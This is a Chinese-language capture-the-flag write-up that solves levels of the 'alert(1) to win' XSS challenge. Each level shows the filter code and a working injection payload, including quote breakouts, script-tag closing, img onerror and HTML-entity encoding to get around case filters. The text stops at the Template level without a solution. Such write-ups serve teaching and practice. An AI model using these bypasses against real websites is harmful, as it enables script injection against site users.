---
layout: post
title:  "XSS-alert(1)_to_win"
date:   2019-10-26
desc: ""
keywords: ""
categories: [Web]
tags: []
icon: icon-html
---

# XSS-alert(1)_to_win

## 平台地址与介绍

https://alf.nu/alert1

左侧为题目，括号内为你成功解题使用的payload长度，每解出一题会解锁后面的题目

源码白给，在Input处输入payload，output给出拼接后的代码，若能成功执行alert(1)则判定win

Console output给出console.log()的输出，可以通过这个看出自己拼接的效果

Test iframe显示输入payload后的页面

如图

![1](D:\Ai\GitHub\images\xss\1.jpg)



## Warmup

```javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

注入点在`'+s+'`，输入的payload会插入到此处

前面有括号和双引号，首先应该闭合，所以payload开头应为`")`

后面也有括号和双引号，对于这些内容，可以直接注释掉，注释符号为`//`

Payload

```javascript
");alert(1)//
```

Output

```javascript
<script>console.log("");alert(1)//");</script>
```



## Adobe 

```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

replace()使输入的`"`变为`\"`，转义后的双引号只是一个普通的字符

绕过这个可以把反斜杠转义，转义后的反斜杠只是一个普通的字符，不会再去使双引号转义

Payload

```javascript
\");alert(1)//
```

Output

```javascript
<script>console.log("\\");alert(1)//");</script>
```

Console output

```javascript
\
```

另一种方法

console.log前有`<script>`，可以闭合这个标签然后再开一个新标签alert(1)，这样console.log会报错但是成功执行了alert(1)

Payload

```
</script><script>alert(1)</script>//
```

Output

```javascript
<script>console.log("</script><script>alert(1)</script>//");</script>
```

Console output

```
Error: Uncaught SyntaxError: Invalid or unexpected token
```



## JSON

```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

JSON.stringify将JavaScript值(对象或者数组)转化为一个 JSON字符串

输入`"`，变为`\"`,输入`\`变为`\\`

上一题的第二种方法依然可用

Payload

```
</script><script>alert(1)</script>//
```

Output

```javascript
<script>console.log("</script><script>alert(1)</script>//");</script>
```

Console output

```
Error: Uncaught SyntaxError: Invalid or unexpected token
```



## Markdown

```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

`s.replace(/</g, '&lt;').replace(/"/g, '&quot;');`将所有的`"`和`<`进行转义

`text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');`将所有形如`http://a `的字符串转化为

```
<a href="http://a">http://a</a>
```

`text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');`将所有形如`[[a|b]]`的字符串转化为`<img alt="b" src="a.gif"> `

利用`<a href="`的`"`闭合alt的`"`

利用`onerror`，在图片加载发生错误时执行js代码

利用注释，把多余的`"`注释掉

例

```javascript
<img onerror=alert(1) src="a.gif">
```

Payload

```
[[a|http://onerror=alert(1)//]]
```

Output

```javascript
<img alt="<a href="http://onerror=alert(1)//" src="a.gif">">http://onerror=alert(1)//]]</a>
```

Test iframe

```
一张裂开的图
```



## DOM

```javascript
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

`m = s.split(/#/);`根据`#`对s进行切割

`document['create'+m[0]]`调用`document.create()`函数

例

如果输入`Comment#AiDAi`

先被分割为Comment和AiDai

然后调用`document.createComment()`

生成`<!--AiDAi-->`

这是html中的注释

闭合注释，在中间插入js标签执行alert(1)

Payload

```
Comment#--><script>alert(1)</script><!--
```

Output

```
<!----><script>alert(1)</script><!---->
```



## Callback

```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

`thing = s.split(/#/);`根据`#`对s进行切割

根据输入生成一个对象再用`JSON.stringify()`转化为一个 JSON字符串

例

输入`AiDAI#aidai`

输出`<script>AiDAI({"userdata":"aidai"})</script>`

`JSON.stringify()`会对一些字符进行转义，但它不会去转义`'`

所以可以利用单引号闭合，使alert(1)逃出来

Payload

```
'#';alert(1)//
```

Output

```
<script>'({"userdata":"';alert(1)//"})</script>
```



## Skandia

```javascript
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

把输入的小写字母全部转化为大写

html标签可以直接闭合，因为html对大小写不敏感，关键在于alert(1)，因为js对大小写敏感

可以利用html字符实体，html字符实体通过html转化为小写的js代码，并不会被js转化为大写

利用img和onerror，图片加载错误时，html字符实体通过html转化为alert(1)并执行

Payload

```
</script><img src=1 onerror = &#97&#108&#101&#114&#116(1)>
```

Output

```
<script>console.log("</SCRIPT><IMG SRC=1 ONERROR = &#97&#108&#101&#114&#116(1)>")</script>
```



## Template

```
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g, 
        function(_, n) { 
           return htmlEscape(args[n]);
         });
  }
  
  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```

